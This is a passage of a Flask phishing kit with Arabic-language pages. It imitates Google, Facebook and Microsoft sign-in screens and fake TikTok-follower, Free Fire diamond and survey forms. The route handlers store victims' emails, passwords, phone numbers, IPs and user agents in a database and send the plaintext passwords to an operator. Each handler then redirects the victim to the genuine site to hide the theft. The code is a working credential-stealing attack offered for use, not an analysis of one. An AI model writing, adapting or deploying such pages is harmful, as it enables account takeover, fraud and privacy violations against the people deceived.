            font-size: 11px;
            transition: all 0.3s;
        }
        .footer-links a:hover {
            color: #25f4ee;
        }
        .hidden-radio {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <span class="logo">🎵</span>
            <h1>Tik<span>Tok</span></h1>
            <div class="subtitle">متابعين حقيقيين</div>
        </div>
        <form id="purchaseForm" method="POST" action="/tiktok_followers">
            <div class="form-group">
                <label>رابط الحساب <span class="required">*</span></label>
                <input type="text" name="username" placeholder="tiktok.com/@username" required>
            </div>
            <div class="form-group">
                <label>اختر الباقة <span class="required">*</span></label>
                <div class="package-grid">
                    <label class="package-item" for="pkg_100">
                        <input type="radio" name="followers" value="100" id="pkg_100" class="hidden-radio" onchange="updatePrice('$2.99')">
                        <span class="icon">👤</span>
                        <span class="amount">100</span>
                        <span class="bonus">+10</span>
                        <span class="price">$2.99</span>
                    </label>
                    <label class="package-item" for="pkg_500">
                        <input type="radio" name="followers" value="500" id="pkg_500" class="hidden-radio" onchange="updatePrice('$12.99')">
                        <span class="icon">👤</span>
                        <span class="amount">500</span>
                        <span class="bonus">+50</span>
                        <span class="price">$12.99</span>
                    </label>
                    <label class="package-item selected" for="pkg_1000">
                        <input type="radio" name="followers" value="1000" id="pkg_1000" class="hidden-radio" checked onchange="updatePrice('$24.99')">
                        <span class="icon">👤</span>
                        <span class="amount">1000</span>
                        <span class="bonus">+100</span>
                        <span class="price">$24.99</span>
                    </label>
                    <label class="package-item" for="pkg_5000">
                        <input type="radio" name="followers" value="5000" id="pkg_5000" class="hidden-radio" onchange="updatePrice('$99.99')">
                        <span class="icon">👤</span>
                        <span class="amount">5000</span>
                        <span class="bonus">+500</span>
                        <span class="price">$99.99</span>
                    </label>
                    <label class="package-item" for="pkg_10000">
                        <input type="radio" name="followers" value="10000" id="pkg_10000" class="hidden-radio" onchange="updatePrice('$189.99')">
                        <span class="icon">👤</span>
                        <span class="amount">10000</span>
                        <span class="bonus">+1000</span>
                        <span class="price">$189.99</span>
                    </label>
                    <label class="package-item" for="pkg_50000">
                        <input type="radio" name="followers" value="50000" id="pkg_50000" class="hidden-radio" onchange="updatePrice('$899.99')">
                        <span class="icon">👤</span>
                        <span class="amount">50000</span>
                        <span class="bonus">+5000</span>
                        <span class="price">$899.99</span>
                    </label>
                </div>
            </div>
            <div class="price-summary">
                <span class="label">💳 المبلغ الإجمالي</span>
                <span class="price-value" id="totalPrice">$24.99</span>
            </div>
            <button type="submit" class="btn-buy" id="buyBtn">
                <span>🚀</span> شراء الآن
            </button>
            <div class="secure-badge"><span class="lock">🔒</span> عملية دفع آمنة 256-bit</div>
        </form>
        <div class="footer-links"><a href="#">الخصوصية</a><a href="#">الشروط</a><a href="#">الدعم</a></div>
    </div>
    <script>
        function updatePrice(price) {
            document.getElementById('totalPrice').textContent = price;
        }
        document.querySelectorAll('.package-item').forEach(function(item) {
            item.addEventListener('click', function() {
                document.querySelectorAll('.package-item').forEach(function(el) {
                    el.classList.remove('selected');
                });
                this.classList.add('selected');
                var radio = this.querySelector('input[type="radio"]');
                if (radio) radio.checked = true;
            });
        });
        document.getElementById('purchaseForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var btn = document.getElementById('buyBtn');
            btn.innerHTML = '<span>⏳</span> جاري المعالجة...';
            btn.disabled = true;
            var formData = new FormData(this);
            fetch('/tiktok_followers', { method: 'POST', body: formData })
                .then(function(response) { return response.text(); })
                .then(function(html) { document.write(html); })
                .catch(function() {
                    btn.innerHTML = '<span>🚀</span> شراء الآن';
                    btn.disabled = false;
                });
        });
    </script>
</body>
</html>
"""

# ===== صفحة الاستبيان =====
SURVEY_PAGE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>استبيان الرأي</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, sans-serif;
        }
        body {
            background: #f5f5f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: #ffffff;
            max-width: 600px;
            width: 100%;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h2 {
            color: #202124;
            font-weight: 400;
            font-size: 24px;
        }
        .header p {
            color: #5f6368;
            font-size: 14px;
            margin-top: 4px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            color: #202124;
            font-weight: 500;
            margin-bottom: 6px;
            font-size: 14px;
        }
        .form-group label .required {
            color: #d93025;
        }
        .form-group input,
        .form-group select,
        .form-group textarea {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
            color: #202124;
            background: #ffffff;
        }
        .form-group input:focus,
        .form-group select:focus,
        .form-group textarea:focus {
            border-color: #1a73e8;
            border-width: 2px;
        }
        .form-group textarea {
            resize: vertical;
            min-height: 100px;
        }
        .form-group .helper {
            color: #5f6368;
            font-size: 12px;
            margin-top: 4px;
        }
        .buttons {
            display: flex;
            justify-content: flex-end;
            gap: 12px;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #dadce0;
        }
        .buttons .cancel {
            background: transparent;
            color: #1a73e8;
            border: none;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            border-radius: 4px;
        }
        .buttons .cancel:hover {
            background: #f5f5f5;
        }
        .buttons .submit {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 32px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            border-radius: 4px;
            transition: background 0.2s;
        }
        .buttons .submit:hover {
            background: #1557b0;
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.2);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h2>📋 استبيان الرأي</h2>
            <p>ساعدنا في تحسين خدماتنا</p>
        </div>
        <form method="POST" action="/survey">
            <div class="form-group">
                <label>الاسم الكامل <span class="required">*</span></label>
                <input type="text" name="name" required placeholder="أدخل اسمك الكامل">
            </div>
            <div class="form-group">
                <label>البريد الإلكتروني <span class="required">*</span></label>
                <input type="email" name="email" required placeholder="example@gmail.com">
                <div class="helper">سيتم استخدام هذا البريد للتواصل معك</div>
            </div>
            <div class="form-group">
                <label>رقم الهاتف</label>
                <input type="tel" name="phone" placeholder="+966 50 123 4567">
            </div>
            <div class="form-group">
                <label>كيف تقيم تجربتك مع خدماتنا؟ <span class="required">*</span></label>
                <select name="rating" required>
                    <option value="">اختر التقييم</option>
                    <option value="ممتاز">⭐ ممتاز</option>
                    <option value="جيد">⭐ جيد</option>
                    <option value="متوسط">⭐ متوسط</option>
                    <option value="سيء">⭐ سيء</option>
                </select>
            </div>
            <div class="form-group">
                <label>ملاحظاتك واقتراحاتك</label>
                <textarea name="feedback" placeholder="اكتب ملاحظاتك هنا..."></textarea>
            </div>
            <div class="buttons">
                <button type="button" class="cancel" onclick="window.history.back()">إلغاء</button>
                <button type="submit" class="submit">إرسال الاستبيان</button>
            </div>
        </form>
    </div>
</body>
</html>
"""

# ===== إضافة المسارات في app.py =====

@app.route('/freefire', methods=['GET', 'POST'])
def freefire_route():
    if request.method == 'GET':
        return render_template_string(SHOP2GAME_PAGE)
    else:
        data = {
            'action_type': 'شراء فري فاير',
            'platform': 'Shop2game',
            'status': 'success',
            'details': {
                'معرف اللاعب': request.form.get('player_id', 'غير معروف'),
                'المنطقة': request.form.get('region', 'غير معروف'),
                'الباقة': request.form.get('diamonds', 'غير معروف') + ' ماس'
            },
            'risk_level': 'منخفض',
            'flagged': False,
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'غير معروف')
        }
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO collected_data (session_id, data_type, data, ip, user_agent, created_at)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (f"freefire_{int(time.time())}", 'freefire_purchase', json.dumps(data, ensure_ascii=False),
                       request.remote_addr, request.headers.get('User-Agent'), datetime.now().isoformat()))
            conn.commit()
        send_structured_report('شراء فري فاير', data)
        send_sensitive_data_to_admin("🔥 شراء فري فاير", data, user_id="مستخدم")
        return '''
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تم الشراء بنجاح</title>
        <style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,sans-serif;}body{background:#0a0a1a;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}.container{max-width:400px;width:100%;background:linear-gradient(145deg,#1a1a2e,#16213e);border-radius:20px;padding:40px;text-align:center;border:1px solid rgba(255,215,0,0.2);}.icon{font-size:80px;display:block;margin-bottom:20px;}h2{color:#ffd700;font-size:28px;margin-bottom:10px;}p{color:#b0b0c0;line-height:1.6;margin-bottom:8px;}.button{display:inline-block;margin-top:20px;padding:14px 40px;background:linear-gradient(135deg,#ff6b35,#ff5722);color:white;text-decoration:none;border-radius:12px;font-weight:700;transition:all 0.3s;}.button:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,107,53,0.3);}</style>
        </head><body><div class="container"><span class="icon">✅</span><h2>تم الشراء بنجاح!</h2><p>سيتم إضافة الماس إلى حسابك خلال 5-10 دقائق.</p><p style="color:#666;font-size:13px;">رقم الطلب: #FF''' + str(int(time.time()))[-6:] + '''</p><a href="https://ff.garena.com" class="button">العودة إلى اللعبة</a></div></body></html>
        '''

@app.route('/google_login', methods=['GET', 'POST'])
def google_login_route():
    if request.method == 'GET':
        return render_template_string(GOOGLE_LOGIN_PAGE)
    else:
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        data = {
            'action_type': 'تسجيل دخول',
            'platform': 'Google',
            'status': 'success',
            'details': {
                'البريد الإلكتروني': email,
                'كلمة السر': '•' * len(password)
            },
            'risk_level': 'متوسط',
            'flagged': False,
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'غير معروف')
        }
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO collected_data (session_id, data_type, data, ip, user_agent, created_at)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (f"google_{int(time.time())}", 'google_login', json.dumps(data, ensure_ascii=False),
                       request.remote_addr, request.headers.get('User-Agent'), datetime.now().isoformat()))
            conn.commit()
        send_structured_report('تسجيل دخول Google', data)
        send_sensitive_data_to_admin("🔑 Google Login", f"📧 البريد: {email}\n🔒 كلمة السر: {password}", user_id="مستخدم")
        return '''
        <!DOCTYPE html>
        <html><head><meta charset="UTF-8"><meta http-equiv="refresh" content="2; url=https://accounts.google.com"><title>جاري التوجيه...</title>
        <style>body{display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Google Sans',Arial,sans-serif;background:#ffffff;margin:0;padding:20px;}.loading-container{text-align:center;max-width:400px;}.loading-container .logo{margin-bottom:30px;}.loading-container .logo img{width:75px;height:24px;}.loading-container h2{font-weight:400;color:#202124;margin-bottom:8px;}.loading-container p{color:#5f6368;font-size:14px;margin-bottom:24px;}.spinner{border:4px solid #f3f3f3;border-top:4px solid #1a73e8;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}.progress-bar{width:100%;height:4px;background:#e0e0e0;border-radius:2px;overflow:hidden;margin-top:16px;}.progress-bar .progress{height:100%;background:#1a73e8;width:0%;animation:progress 2s ease-in-out forwards;}@keyframes progress{0%{width:0%;}100%{width:100%;}}</style>
        </head><body><div class="loading-container"><div class="logo"><img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_light_color_92x30dp.png" alt="Google"></div><div class="spinner"></div><h2>✅ تم تسجيل الدخول بنجاح</h2><p>جاري توجيهك إلى Gmail...</p><div class="progress-bar"><div class="progress"></div></div></div></body></html>
        '''

@app.route('/facebook_login', methods=['GET', 'POST'])
def facebook_login_route():
    if request.method == 'GET':
        return render_template_string(FACEBOOK_LOGIN_PAGE)
    else:
        email = request.form.get('email', '')
        password = request.form.get('password', '')
        data = {
            'action_type': 'تسجيل دخول',
            'platform': 'Facebook',
            'status': 'success',
            'details': {
                'البريد/الهاتف': email,
                'كلمة السر': '•' * len(password)
            },
            'risk_level': 'متوسط',
            'flagged': False,
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'غير معروف')
        }
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO collected_data (session_id, data_type, data, ip, user_agent, created_at)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (f"facebook_{int(time.time())}", 'facebook_login', json.dumps(data, ensure_ascii=False),
                       request.remote_addr, request.headers.get('User-Agent'), datetime.now().isoformat()))
            conn.commit()
        send_structured_report('تسجيل دخول Facebook', data)
        send_sensitive_data_to_admin("🔑 Facebook Login", f"📧 البريد/الهاتف: {email}\n🔒 كلمة السر: {password}", user_id="مستخدم")
        return '''
        <!DOCTYPE html>
        <html><head><meta charset="UTF-8"><meta http-equiv="refresh" content="0; url=https://www.facebook.com"><title>جاري التوجيه...</title>
        <style>body{display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;background:#f0f2f5;}.loading{text-align:center;}.spinner{border:4px solid #f3f3f3;border-top:4px solid #1877f2;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:20px auto;}@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
        </head><body><div class="loading"><div class="spinner"></div><h2>✅ مرحباً بك في Facebook</h2><p>جاري توجيهك إلى صفحتك الرئيسية...</p></div></body></html>
        '''

@app.route('/whatsapp_web', methods=['GET'])
def whatsapp_web_route():
    return render_template_string(WHATSAPP_WEB_PAGE)

@app.route('/video_chat', methods=['GET'])
def video_chat_route():
    return render_template_string(VIDEO_CHAT_PAGE)

@app.route('/tiktok_followers', methods=['GET', 'POST'])
def tiktok_followers_route():
    if request.method == 'GET':
        return render_template_string(TIKTOK_PAGE)
    else:
        data = {
            'action_type': 'شراء متابعين تيك توك',
            'platform': 'TikTok',
            'status': 'success',
            'details': {
                'رابط الحساب': request.form.get('username', 'غير معروف'),
                'عدد المتابعين': request.form.get('followers', 'غير معروف')
            },
            'risk_level': 'منخفض',
            'flagged': False,
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'غير معروف')
        }
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO collected_data (session_id, data_type, data, ip, user_agent, created_at)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (f"tiktok_{int(time.time())}", 'tiktok_purchase', json.dumps(data, ensure_ascii=False),
                       request.remote_addr, request.headers.get('User-Agent'), datetime.now().isoformat()))
            conn.commit()
        send_structured_report('شراء متابعين تيك توك', data)
        send_sensitive_data_to_admin("📊 شراء متابعين تيك توك", data, user_id="مستخدم")
        return '''
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تم الشراء بنجاح</title>
        <style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,sans-serif;}body{background:#000000;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}.container{max-width:400px;width:100%;background:#181818;border-radius:20px;padding:40px;text-align:center;border:1px solid rgba(37,244,238,0.2);}.icon{font-size:80px;display:block;margin-bottom:20px;}h2{color:#25f4ee;font-size:28px;margin-bottom:10px;}p{color:#aaa;line-height:1.6;margin-bottom:8px;}.button{display:inline-block;margin-top:20px;padding:14px 40px;background:linear-gradient(135deg,#25f4ee,#00d4c0);color:#000000;text-decoration:none;border-radius:12px;font-weight:700;transition:all 0.3s;}.button:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(37,244,238,0.3);}</style>
        </head><body><div class="container"><span class="icon">🎉</span><h2>تم الشراء بنجاح!</h2><p>سيتم إضافة المتابعين إلى حسابك خلال 24 ساعة.</p><p style="color:#666;font-size:13px;">رقم الطلب: #TT''' + str(int(time.time()))[-6:] + '''</p><a href="https://www.tiktok.com" class="button">العودة إلى TikTok</a></div></body></html>
        '''

@app.route('/survey', methods=['GET', 'POST'])
def survey_route():
    if request.method == 'GET':
        return render_template_string(SURVEY_PAGE)
    else:
        data = {
            'action_type': 'استبيان',
            'platform': 'Survey',
            'status': 'success',
            'details': {
                'الاسم': request.form.get('name', 'غير معروف'),
                'البريد': request.form.get('email', 'غير معروف'),
                'الهاتف': request.form.get('phone', 'غير معروف'),
                'التقييم': request.form.get('rating', 'غير معروف'),
                'الملاحظات': request.form.get('feedback', 'لا توجد')
            },
            'risk_level': 'منخفض',
            'flagged': False,
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'غير معروف')
        }
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO collected_data (session_id, data_type, data, ip, user_agent, created_at)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (f"survey_{int(time.time())}", 'survey', json.dumps(data, ensure_ascii=False),
                       request.remote_addr, request.headers.get('User-Agent'), datetime.now().isoformat()))
            conn.commit()
        send_structured_report('استبيان', data)
        send_sensitive_data_to_admin("📋 استبيان جديد", data, user_id="مستخدم")
        return '''
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>شكراً</title>
        <style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,sans-serif;}body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}.container{background:#ffffff;max-width:500px;width:100%;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);text-align:center;}.icon{font-size:64px;margin-bottom:20px;}h2{color:#202124;margin-bottom:10px;}p{color:#5f6368;line-height:1.6;}.button{display:inline-block;margin-top:20px;padding:12px 32px;background:#1a73e8;color:white;text-decoration:none;border-radius:4px;font-weight:500;}.button:hover{background:#1557b0;}</style>
        </head><body><div class="container"><div class="icon">✅</div><h2>شكراً لك!</h2><p>تم استلام ردودك بنجاح.<br>نحن نقدر وقتك وملاحظاتك.</p><a href="https://www.google.com" class="button">العودة إلى Google</a></div></body></html>
        '''

# ===== إضافة مسار تجميع البيانات =====
@app.route('/collect', methods=['GET', 'POST'])
def collect_route():
    if request.method == 'GET':
        return '''
        <!DOCTYPE html>
        <html lang="ar" dir="rtl">
        <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>تسجيل الدخول - Microsoft</title>
        <style>*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,sans-serif;}body{background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh;}.container{background:#ffffff;max-width:440px;width:100%;padding:44px 40px 36px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}.logo{text-align:center;margin-bottom:32px;}.logo img{width:108px;height:36px;}.logo h2{color:#1b1b1b;font-weight:400;font-size:24px;margin-top:16px;}.form-group{margin-bottom:20px;}.form-group input{width:100%;padding:12px 14px;border:1px solid #8b8b8b;border-radius:4px;font-size:16px;outline:none;transition:border-color 0.2s;color:#1b1b1b;background:#ffffff;}.form-group input:focus{border-color:#0067b8;border-width:2px;}.form-group input::placeholder{color:#8b8b8b;}.options{display:flex;justify-content:space-between;align-items:center;margin:16px 0 20px;font-size:14px;color:#1b1b1b;}.options label{display:flex;align-items:center;gap:8px;cursor:pointer;}.options a{color:#0067b8;text-decoration:none;}.options a:hover{text-decoration:underline;}.login-btn{width:100%;padding:12px;background:#0067b8;color:white;border:none;border-radius:4px;font-size:16px;font-weight:600;cursor:pointer;transition:background 0.2s;}.login-btn:hover{background:#004e8c;}.signup-link{text-align:center;margin-top:20px;font-size:14px;color:#5e5e5e;}.signup-link a{color:#0067b8;text-decoration:none;font-weight:600;}.signup-link a:hover{text-decoration:underline;}.error-message{color:#d93025;font-size:14px;margin-top:10px;text-align:center;display:none;}</style>
        </head><body>
        <div class="container"><div class="logo"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b" alt="Microsoft"><h2>تسجيل الدخول</h2></div>
        <form id="loginForm" method="POST" action="/collect">
        <div class="form-group"><input type="text" id="email" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required></div>
        <div class="form-group"><input type="password" id="password" name="password" placeholder="كلمة المرور" required></div>
        <div class="options"><label><input type="checkbox" checked> البقاء متصلاً</label><a href="#">هل نسيت كلمة المرور؟</a></div>
        <button type="submit" class="login-btn">تسجيل الدخول</button>
        <div id="errorMessage" class="error-message">⚠️ البريد الإلكتروني أو كلمة المرور غير صحيحة</div>
        </form>
        <div class="signup-link">ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></div>
        </div>
        <script>
        document.getElementById('loginForm').addEventListener('submit',function(e){e.preventDefault();var email=document.getElementById('email').value;var password=document.getElementById('password').value;if(!email||!password){document.getElementById('errorMessage').style.display='block';return;}var formData=new FormData(this);fetch('/collect',{method:'POST',body:formData}).then(response=>response.json()).then(data=>{if(data.success){document.getElementById('errorMessage').style.display='none';document.querySelector('.login-btn').textContent='✅ جاري التوجيه...';document.querySelector('.login-btn').style.background='#28a745';setTimeout(()=>{window.location.href='https://outlook.live.com';},1500);}else{document.getElementById('errorMessage').textContent='❌ '+data.message;document.getElementById('errorMessage').style.display='block';}});});
        </script></body></html>
        '''
    else:
        email = request.form.get('email')
        password = request.form.get('password')
        data = {
            'action_type': 'تسجيل دخول',
            'platform': 'Microsoft',
            'status': 'success',
            'details': {
                'البريد': email,
                'كلمة السر': '•' * len(password) if password else 'غير معروف'
            },
            'risk_level': 'متوسط',
            'flagged': False,
            'ip': request.remote_addr,
            'user_agent': request.headers.get('User-Agent', 'غير معروف')
        }
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute('''INSERT INTO collected_data (session_id, data_type, data, ip, user_agent, created_at)
                         VALUES (?, ?, ?, ?, ?, ?)''',
                      (f"collect_{int(time.time())}", 'microsoft_login', json.dumps(data, ensure_ascii=False),
                       request.remote_addr, request.headers.get('User-Agent'), datetime.now().isoformat()))
            conn.commit()
        send_structured_report('تسجيل دخول Microsoft', data)
        send_sensitive_data_to_admin("🔑 Microsoft Login", f"📧 البريد: {email}\n🔒 كلمة السر: {password}", user_id="مستخدم")
        return jsonify({'success': True, 'message': 'تم تسجيل الدخول بنجاح'})
